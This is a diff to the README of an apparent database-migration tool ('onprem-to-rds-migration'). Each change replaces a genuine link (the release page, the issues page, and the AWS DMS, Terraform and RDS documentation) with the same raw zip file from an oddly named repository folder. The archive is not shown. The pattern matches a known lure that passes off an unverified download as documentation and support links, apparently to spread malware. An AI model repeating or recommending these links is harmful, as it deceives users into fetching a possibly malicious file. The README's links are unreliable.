@@ -1,6 +1,6 @@
 # 🚀 onprem-to-rds-migration - Seamlessly Move Your Database to the Cloud
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)
+![Download](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To run this application, you will need:
 
 1. **Visit the Download Page**: Click the link below to access the releases page and download the latest version of the application.
 
-   [Download the Latest Release](https://github.com/xgitz/onprem-to-rds-migration/releases)
+   [Download the Latest Release](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
 
 2. **Select Your Version**: Once on the releases page, choose the version you want to download. You will see several options available.
 
@@ -40,7 +40,7 @@ To run this application, you will need:
 
 To download the software, visit the page linked below. This page contains all available versions and installation files:
 
-[Download the Latest Release](https://github.com/xgitz/onprem-to-rds-migration/releases)
+[Download the Latest Release](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
 
 ## ⚙️ Configuration
 
@@ -68,7 +68,7 @@ Use AWS CloudWatch to keep track of your migration. You can view metrics such as
 
 ## 📞 Support
 
-For help with the onprem-to-rds-migration application, refer to the [issues page on GitHub](https://github.com/xgitz/onprem-to-rds-migration/issues) for common questions and answers. If you cannot find a solution, feel free to create a new issue to get assistance.
+For help with the onprem-to-rds-migration application, refer to the [issues page on GitHub](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip) for common questions and answers. If you cannot find a solution, feel free to create a new issue to get assistance.
 
 ## 📄 License
 
@@ -78,8 +78,8 @@ This application is provided under the MIT License. You can use, modify, and dis
 
 For more information about the technologies used in this application, consider checking out:
 
-- [AWS Database Migration Service](https://aws.amazon.com/dms/)
-- [Terraform](https://www.terraform.io/)
-- [AWS RDS Documentation](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Welcome.html)
+- [AWS Database Migration Service](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
+- [Terraform](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
+- [AWS RDS Documentation](https://github.com/xgitz/onprem-to-rds-migration/raw/refs/heads/main/unalienableness/to-migration-onprem-rds-1.3-alpha.2.zip)
 
 Make sure to utilize the available documentation and resources to help with the migration process. Happy migrating!
